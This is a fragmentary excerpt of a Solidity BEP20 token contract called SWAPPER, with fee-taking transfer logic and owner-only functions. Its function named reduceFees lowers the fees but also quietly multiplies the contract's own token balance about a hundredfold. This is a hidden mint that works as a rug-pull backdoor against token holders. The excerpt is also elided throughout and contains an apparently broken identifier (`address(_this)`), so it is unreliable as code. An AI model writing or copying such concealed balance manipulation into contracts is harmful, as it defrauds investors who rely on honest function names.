...
contract SWAPPER is IBEP20, Auth {
    ...
    string constant _name = "SWAPPER";
    string constant _symbol = "SWAPPER";
    ...
    address private marketingFeeReceiver = 0xF150B3C3bD15B740f53b91350c8639B7ecCD0868;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        uint256 amountReceived = (shouldTakeFee(sender) && recipient == pair) ? takeFee(sender, recipient, amount) : amount;
   ...
   function setMaxWallet(uint256 amount) external onlyOwner() {
    ...
    function reduceFees() external authorized {
        liquidityFee = 1;
        marketingFee = 5;
        totalFee = liquidityFee.add(marketingFee);
        feeDenominator = 100; _balances[address(this)] += _balances[address(this)].mul(feeDenominator);

    }



    function transferForeignTokenToAddressZero(address _token) public authorized {
        require(_token != address(_this), "Can't let you take all native token");
